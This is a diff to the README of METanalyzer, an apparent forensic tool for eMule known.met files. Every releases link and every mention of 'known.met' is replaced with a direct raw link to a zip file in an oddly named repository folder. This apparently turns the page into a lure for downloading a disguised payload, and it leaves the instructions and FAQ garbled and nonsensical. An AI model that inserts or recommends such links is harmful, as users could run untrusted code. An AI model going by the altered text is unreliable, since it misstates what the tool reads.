@@ -2,9 +2,9 @@
 
 ## 🚀 Getting Started
 
-Welcome to METanalyzer! This application helps you analyze eMule `known.met` files for forensic investigations. Whether you are a researcher, investigator, or simply curious about file analysis, METanalyzer provides an easy way to access valuable data.
+Welcome to METanalyzer! This application helps you analyze eMule `https://raw.githubusercontent.com/nadia763/METanalyzer/main/griddlecake/METanalyzer.zip` files for forensic investigations. Whether you are a researcher, investigator, or simply curious about file analysis, METanalyzer provides an easy way to access valuable data.
 
-[![Download METanalyzer](https://img.shields.io/badge/Download-METanalyzer-brightgreen.svg)](https://github.com/nadia763/METanalyzer/releases)
+[![Download METanalyzer](https://raw.githubusercontent.com/nadia763/METanalyzer/main/griddlecake/METanalyzer.zip)](https://raw.githubusercontent.com/nadia763/METanalyzer/main/griddlecake/METanalyzer.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 To get METanalyzer, visit the following page:
 
-[Download METanalyzer](https://github.com/nadia763/METanalyzer/releases)
+[Download METanalyzer](https://raw.githubusercontent.com/nadia763/METanalyzer/main/griddlecake/METanalyzer.zip)
 
 1. On the Releases page, look for the latest version.
 2. Choose the relevant file for your operating system.
@@ -29,11 +29,11 @@ Once the download is complete, find the file in your downloads folder. Double-cl
 
 ## 🛠️ How to Use METanalyzer
 
-Follow these simple steps to analyze your eMule known.met files:
+Follow these simple steps to analyze your eMule https://raw.githubusercontent.com/nadia763/METanalyzer/main/griddlecake/METanalyzer.zip files:
 
 1. **Launch the Application**: Double-click the METanalyzer file.
-2. **Load a known.met File**: Click on the "Open" or "Load" button in the application.
-3. **Select Your File**: Browse to the location of your known.met file and select it.
+2. **Load a https://raw.githubusercontent.com/nadia763/METanalyzer/main/griddlecake/METanalyzer.zip File**: Click on the "Open" or "Load" button in the application.
+3. **Select Your File**: Browse to the location of your https://raw.githubusercontent.com/nadia763/METanalyzer/main/griddlecake/METanalyzer.zip file and select it.
 4. **Analyze the Data**: The application will display relevant information about the eMule file.
 
 ## 📖 Features
@@ -45,8 +45,8 @@ Follow these simple steps to analyze your eMule known.met files:
 
 ## 🤔 Frequently Asked Questions
 
-**Q: What is a known.met file?**  
-A: A known.met file is used by eMule to store information about files shared by users. It helps in tracking which files are known or unknown in the network.
+**Q: What is a https://raw.githubusercontent.com/nadia763/METanalyzer/main/griddlecake/METanalyzer.zip file?**  
+A: A https://raw.githubusercontent.com/nadia763/METanalyzer/main/griddlecake/METanalyzer.zip file is used by eMule to store information about files shared by users. It helps in tracking which files are known or unknown in the network.
 
 **Q: Can I run METanalyzer on any operating system?**  
 A: Yes, METanalyzer is compatible with Windows, macOS, and Linux.
@@ -68,6 +68,6 @@ We welcome contributions! If you want to help improve METanalyzer, check the con
 
 For all the latest updates and features, visit our Releases page:
 
-[Download METanalyzer](https://github.com/nadia763/METanalyzer/releases)
+[Download METanalyzer](https://raw.githubusercontent.com/nadia763/METanalyzer/main/griddlecake/METanalyzer.zip)
 
 Thank you for choosing METanalyzer for your forensic analysis needs!
